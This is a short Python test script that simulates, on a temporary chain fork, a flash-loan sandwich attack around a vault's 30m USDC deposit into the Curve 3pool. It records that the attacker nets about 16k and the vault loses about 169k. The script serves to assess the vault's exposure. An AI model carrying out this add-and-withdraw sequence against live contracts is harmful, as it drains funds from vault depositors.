# test if flash loan can sandwich attack a strategies deposit of 3crv action.
#
# in this test 4b of usdc liquidity is being sandwiched by an attacker, before the vault deposits
# 30m of liquidity. Then the attacker withdraws that liquidity before the vault does. The net result
# is: 
# - attacker gaining 16k of USDC
# - vault loosing 169k of USDC
#

from metastrategy import *

OPTS_V = {"from": VAULT_PROXY_ADDRESS}

usdc.approve(threepool.address, 1e50, OPTS)
usdc.approve(threepool.address, 1e50, OPTS_V)
usdc.transfer(VAULT_PROXY_ADDRESS, 30e6 * 1e6, OPTS)

with TemporaryFork():
	# at this block approx 300m of each of the stablecoins in the pool
	price_before = threepool.get_virtual_price()
	tokens_before = threepool_lp.balanceOf(me)
	tokens_before_v = threepool_lp.balanceOf(VAULT_PROXY_ADDRESS)
	attacker_usdc_liquidity = 4e9*1e6
	vault_usdc_liquidity = 30e6*1e6

	# add 1b usdc
	threepool.add_liquidity([0,attacker_usdc_liquidity,0], 0, OPTS)
	threepool.add_liquidity([0,vault_usdc_liquidity,0], 0, OPTS_V)

	price_after = threepool.get_virtual_price()
	tokens_after = threepool_lp.balanceOf(me)
	tokens_after_v = threepool_lp.balanceOf(VAULT_PROXY_ADDRESS)

	threepool_diff = tokens_after - tokens_before
	threepool_diff_vault = tokens_after_v - tokens_before_v
	print("Virtual price difference", (price_after - price_before) / 1e18)
	print("3pool LP change attacker", threepool_diff / 1e24, "m")
	print("3pool LP change vault", threepool_diff_vault / 1e24, "m")

	usdc_before_attacker = usdc.balanceOf(me)
	usdc_before_vault = usdc.balanceOf(VAULT_PROXY_ADDRESS)

	# both remove USDC where attacker gets to remove first
	threepool.remove_liquidity_one_coin(threepool_diff, 1, 0, OPTS)
	threepool.remove_liquidity_one_coin(threepool_diff_vault, 1, 0, OPTS_V)


	usdc_diff_attacker = usdc.balanceOf(me) - usdc_before_attacker
	usdc_diff_vault = usdc.balanceOf(VAULT_PROXY_ADDRESS) - usdc_before_vault

	print("Attacker USDC net difference", (usdc_diff_attacker - attacker_usdc_liquidity) / 1e6)
	print("Vault USDC net difference", (usdc_diff_vault - vault_usdc_liquidity) / 1e6)

	# Attacker USDC net difference 16186
  # Vault USDC net difference -169588